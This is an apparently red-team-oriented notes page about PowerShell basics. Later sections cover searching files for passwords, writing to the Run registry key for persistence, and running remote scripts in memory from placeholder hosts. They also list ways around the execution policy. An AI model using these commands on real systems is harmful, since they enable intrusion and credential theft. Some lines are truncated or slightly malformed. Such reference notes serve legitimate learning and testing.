# PowerShell

## PowerShell Syntax

For PowerShell syntax examples see my scripting page [here](../os-agnostic/scripting/script-language-comparison.md).

## PowerShell Commands

In PowerShell, there are three main types of commands: cmdlets, functions, and aliases.

### Cmdlets

Cmdlet is pronounced "command-let". They are instances of .NET classes, not stand-alone executables like in other shell environments. This makes it extremely easy for third parties to extend the functionality of PowerShell without compiling new binaries. Cmdlet names have the form "Verb-Noun" to make them easily discoverable (according to Microsoft anyway!).

Since cmdlets are an actual instance of a .NET class, the output from a command is a bit different than in a traditional command shell. Instead of the common standard-in and standard-out, PowerShell returns an object that contains a number of properties of which a select number are displayed depending on the cmdlet. Objects returned by a cmdlet often have many more discoverable properties and methods that can be manipulated and acted on by those with experience, through experimentation, or by reading the documentation. This makes it extremely powerful.

You can also use them in pretty much the same way as commands in a traditional shell environment without knowing any of this, though you will get much more out of it if you take the time to learn.

#### cmdlet verbs

Cmdlets are restricted to only a set list of verbs. Nouns can be whatever you want, but should follow Third party developers and scripters are encouraged by Microsoft to only use ones from this list for consistency, but PowerShell will not deny modules that use other verbs from running. The most common verbs are **New**, **Get**, **Set**, and **Invoke**, though there are many more. You can read more about this [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7).

#### The Three Core Cmdlets

If you know how to use these three cmdlets, you can figure out how to use any other cmdlet.

Run `Get-Help $cmdlet_name -Examples` for usage

### Functions

PowerShell functions are reusable blocks of code that can be executed by calling their name. They are similar to cmdlets but are user-defined and can include custom logic. Functions are a core part of PowerShell scripting and automation.

#### Creating Functions

To create a function in PowerShell, use the `function` keyword followed by the function name and a script block:

```powershell
function Greet {
    param (
        [string]$Name
    )
    Write-Output "Hello, $Name!"
}

# Usage
Greet -Name "World"
# Output: Hello, World!
```

#### Anonymous Functions

Anonymous functions, also known as script blocks, are unnamed blocks of code that can be assigned to variables or passed as arguments:

```powershell
# Assigning a script block to a variable
$myScriptBlock = {
    param($x, $y)
    $x + $y
}

# Invoking the script block
$myScriptBlock.Invoke(5, 10)  # Output: 15
```

### Aliases

There are many built-in aliases for the most commonly used cmdlets. The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way. Here are some commonly used examples. You can use the `Get-Alias` cmdlet to see the full list.

| Cmdlet          | Aliases                                                                              |

## Script Execution Policy

TODO: add short description about what this is and why it's important (issue [#26](https://github.com/zweilosec/Infosec-Notes/issues/26))

| Policy           | Description                                                                                                                                                                                                                    |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **AllSigned**    | All .ps1 files must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run.                                                                                           |
| **Bypass**       | Bypasses checks for whether files are signed, and internet origin is not verified.                                                                                                                                             |
| **Default**      | The default policies are **Restricted** (client systems) or **RemoteSigned** (Server 2016+)                                                                                                                                    |
| **RemoteSigned** | All .ps1 files originating from the internet must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. Allows local scripts and remote scripts if they are signed. |
| **Restricted**   | All .ps1 files are blocked.                                                                                                                                                                                                    |
| **Undefined**    | There is no execution policy set in the current scope. Reverts to **Default** policy.                                                                                                                                          |

To view current execution policy check use the cmdlet `Get-ExecutionPolicy`. If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems (Windows 10) or **RemoteSigned** (Server 2016+). _\*\*_The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`.

{% hint style="success" %}
For**`Execution-Policy`** bypass methods for privilege escalation and so on see [this section](windows-redteam/privilege-escalation.md#script-execution-policy-bypass-methods).
{% endhint %}

## Environment Variables

{% tabs %}
{% tab title="PowerShell" %}
Show all current environment variables in PowerShell: `Get-ChildItem Env:`

Also aliased to: `dir env:` or `ls env:` or `gci env:`

Environment variables can be `echo`'d or used in scripts by prefixing them with `$env:`.  Ex:&#x20;

```bash
echo $env:USERNAME
#bob
```
{% endtab %}

{% tab title="cmd.exe" %}
Show all current environment variables in cmd.exe: `set`

Environment variables can be `echo`'d or used in scripts by bracketing them with `%`.  Ex:&#x20;

```bash
echo %USERNAME%
#bob
```
{% endtab %}
{% endtabs %}

Convert cmd.exe environment variables to PowerShell:

```
%SYSTEMROOT% == $env:SystemRoot
```

You can assign values to Environment Variables without using a cmdlet using the following syntax:

```bash
$Env:$var = "$value"
```

Examples:

* `$env:username`
* `$env:hostname`
* `$env:path`

{% hint style="info" %}
If you set a value to a environment variable that does not exist, Windows will create it.  You can use this to create your own custom environment variables.
{% endhint %}

You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:

### Adding a Folder to PATH

```powershell
Set-Item -Path Env:PATH -Value ($Env:Path + ";C:\Windows\Temp")
```

{% hint style="info" %}
In this command, the value **`$Env:Path + ";C:\Windows\Temp"`** is enclosed in parentheses so that it is interpreted as a single unit.
{% endhint %}

{% tabs %}
{% tab title="Windows" %}
To append `C:\Windows\Temp` to the PATH , use the following syntax (note the (`;`) separator):

```bash
$Env:PATH += ";C:\Windows\Temp"
```
{% endtab %}

{% tab title="Linux/MacOS" %}
On Linux or MacOS, the colon (`:`) in the command separates each path in the list.

```bash
$Env:PATH += ":/temp"
```
{% endtab %}
{% endtabs %}

#### Add a folder to PATH using `System.Environment` methods <a href="#using-systemenvironment-methods" id="using-systemenvironment-methods"></a>

The **System.Environment** class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.

The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy

```powershell
$path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
$newpath = $path + ';C:\Program Files\Fabrikam\Modules'
```

## Working with Files

Find hidden files

```powershell
Get-ChildItem -Force
```

### Change file attributes

This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.

```powershell
$file = (Get-ChildItem $file_name) #can shorten command with gci, dir, or ls
$file.attributes #Show the files attributes
# Normal

#Flip the bit of the Hidden attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
# Hidden

#To remove the 'Hidden' attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
# Normal
```

### Recursively search for files that contain a certain string

[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) - look for text in a file and lists its name and contents. These examples are looking for the word 'password'.

#### Shorthand (aliased) version:

```bash
ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}
```

Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`.

```bash
ls -R | ? { $_ | sls 'password' } | % { $_ ; gc $_ }
```

The above is expanded for visibility of the individual elements. The shorthand version is condensed for situations where characters are at a premium.

#### Full version:

```powershell
Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
```

#### Explanation:

```powershell
# Get a listing of all files within this folder and its subfolders.
Get-ChildItem -Recurse |

# Filter files according to a script.
Where-Object {
    # Pick only the files that contain the string 'password'.
    # Note: The -Quiet parameter tells Select-String to only return a Boolean. This is preferred if you just need to use Select-String as part of a filter, and don't need the output.
    (Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true
} |

# Run commands against each object found.
ForEach-Object {
    # Output the file properties.
    Write-Output $_;

    # Output the file's contents.
    Get-Content $_
}
```

Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names in the shorthand version, you may want to note the following significant differences between the "full" versions and the "condensed" version:

* `Select-String` was swapped to use piped input instead of `-InputObject`.&#x20;
* The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional.&#x20;
* The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line.&#x20;
* `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true.&#x20;
  * Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.&#x20;
* `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
  * `ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}`

## Modifying the Registry

Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path (a popular persistence location!), but any path can be substituted.

```powershell
# add a new key to registry:
New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name

# then set its properties with:
New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $key_name -Value "$key_value"

# To edit a value that is already set:
Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name -Value "$new_value"
```

### Downloading files with PowerShell (`wget`)&#x20;

#### PowerShell version of `wget:`

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('$ip:$port/$file','$outfile'))"
```

You can also use the example below to save the file to the local machine.

```powershell
wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html
```

`wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile $out_file` is needed to save the file to disk.

Retrieve file and execute remote code after downloading (in-memory!):

```bash
powershell -c "Invoke-Expression(New-Object System.Net.Webclient).downloadString('http://$ip:$port/$file')"
```

### PowerShell Script Execution Bypass

TODO: Expand and clean up PowerShell Bypass section. Link to Windows Privilege Escalation page (issue [#27](https://github.com/zweilosec/Infosec-Notes/issues/27))

* Take examples from [https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) and add
* Write script example of embedding the below PowerShell bypass in php script
* Check the PowerShell example below and see if the trailing `-` means something is missing
* Link or add this information to Windows Privilege Escalation page

Get the current PowerShell script execution policy with:

```powershell
Get-ExecutionPolicy -List
```

Most likely this will be set to `Restricted`, but you need to have admin rights to change this (with one caveat later). So, in order to run scripts, you will need to use one of the following bypass methods.

#### Change Execution Method with `-Scope CurrentUser`

```powershell
Set-ExecutionPolicy -Scope CurrentUser Bypass
```

You can change the Execution Policy for the current user by using the `-Scope CurrentUser` argument.  This will still not allow you to run scripts in other contexts (such as in scheduled tasks), but all scripts run as the current user will now function just fine.   This is the easiest bypass method but requires making a configuration change that could potentially be detected.

#### Copy and paste script code into PowerShell

The second easiest method is to simply copy and paste the code from the script into a PowerShell console.  It may prompt you to verify that you intend to paste multiple lines, simply click "yes".  As long as the code does not have any strange formatting that prevents it from running line by line, the whole script will run.  If the script contains a function, you can continue to use this function simply by calling its name.

#### `Echo` the script code into PowerShell

This technique is similar to the previous, in that you must copy and paste the code from the script into a PowerShell console.  However, you must prefix your code with the `echo` (Alias for `Write-Output`) command and then pipe the copied code into `PowerShell.exe`, like below:

```powershell
echo Test-YourCode | PowerShell -NoProfile -
```

If your code contains multiple lines, quotes, or is contained within a function it may not execute properly, or at all.  You will have to experiment with wrapping the code in quotes or escaping certain characters.  This may seem like a pain, but the upside to this technique is that it requires no configuration changes, and the code is run entirely in memory. &#x20;

#### Read the contents of a file and pipe code into PowerShell

Similar to the previous example, but with the major advantage of not having to do any complicated nested quoting or escaping to get the code to function normally.  However, this technique does rely on the file being either on disk, or accessible through a network share.

```powershell
Get-Content "\\RemoteComp\Test-YourCode.ps1" | PowerShell -NoProfile -
```



...more to come!

```bash
echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$script_file) | PowerShell -NoProfile -
```

### Silence PowerShell error messages

Many PowerShell cmdlets support the **`-ErrorAction SilentlyContinue`** attribute, which works similarly to using **`2>/dev/null`** in Linux. However, this only works for that cmdlet, not the entire one-liner if you pipe output or use semi-colons, etc. This can be shortened to **`-EA Silently`**.
